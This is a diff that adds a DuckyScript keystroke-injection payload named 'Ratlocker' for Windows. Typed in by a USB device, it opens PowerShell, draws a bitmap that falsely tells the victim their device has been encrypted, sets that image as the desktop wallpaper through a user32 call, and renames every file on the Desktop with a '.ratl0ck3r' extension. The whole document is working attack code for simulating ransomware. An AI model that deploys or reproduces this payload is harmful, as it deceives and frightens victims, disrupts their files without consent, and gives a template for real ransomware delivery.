@@ -1,0 +1,88 @@
+REM Title:          Ratlocker
+REM Author:	    Ratcode404(.github.io)
+REM Target: Windows
+REM Description: Adds ratcode file extensions, draws and sets background without the use of URLs or image download (avoid proxy blocking and detection). The original wallpaper will be backuped on \pictures\wallpaper.ratl0ck3r, so no files will be lost. The current setup only targets the files and folder structures on $HOME\Desktop\, but it could be easily extended by adjusting the path variable further down.
+
+REM Base delay after initiation and ps1 startup
+DELAY 250
+GUI d
+GUI r
+DELAY 100
+STRING powershell.exe
+ENTER
+DELAY 250
+
+REM Backup Wallpaper
+STRING Copy-Item "$HOME\AppData\Roaming\Microsoft\Windows\Themes\TranscodedWallpaper" -Destination $home\pictures\wallpaper.ratl0ck3r
+ENTER
+DELAY 250
+
+REM Create new wallpaper
+STRING Add-Type -AssemblyName System.Drawing
+ENTER
+STRING $filename = "$home\pictures\ratl0ck3r.png"
+ENTER
+STRING $bmp = new-object System.Drawing.Bitmap 34401720,720
+ENTER
+STRING $font = new-object System.Drawing.Font Consolas,12
+ENTER
+STRING $brushBg = [System.Drawing.Brushes]::Black
+ENTER
+STRING $brushFg = [System.Drawing.Brushes]::White
+ENTER
+STRING $graphics = [System.Drawing.Graphics]::FromImage($bmp)
+ENTER
+STRING $graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height)
+ENTER
+STRING $graphics.DrawString('Your device has been encrypted by ratcode.
+ENTER
+STRING             .-.
+ENTER
+STRING            (0.0)
+ENTER
+STRING          -=.|m|.=-
+ENTER
+STRING          .=- x -=.',$font,$brushFg,10,10)
+ENTER
+STRING $graphics.Dispose()
+ENTER
+STRING $bmp.Save($filename) 
+ENTER
+DELAY 500
+
+REM Set new wallpaper
+STRING $MyWallpaper="$home\pictures\ratl0ck3r.png"
+ENTER
+STRING $code = @'
+ENTER
+STRING using System.Runtime.InteropServices;
+ENTER
+STRING namespace Win32{
+ENTER
+STRING      public class Wallpaper{
+ENTER
+STRING         [DllImport("user32.dll", CharSet=CharSet.Auto)]
+ENTER
+STRING          static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;
+ENTER
+STRING          public static void SetWallpaper(string thePath){
+ENTER
+STRING            SystemParametersInfo(20,0,thePath,3);
+ENTER
+STRING          }
+ENTER
+STRING     }
+ENTER
+STRING  } 
+ENTER
+STRING '@
+ENTER
+STRING add-type $code 
+ENTER
+STRING [Win32.Wallpaper]::SetWallpaper($MyWallpaper)
+ENTER
+DELAY 500
+
+REM Add ratl0ck3r extension
+STRING dir $HOME\Desktop\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
+ENTER
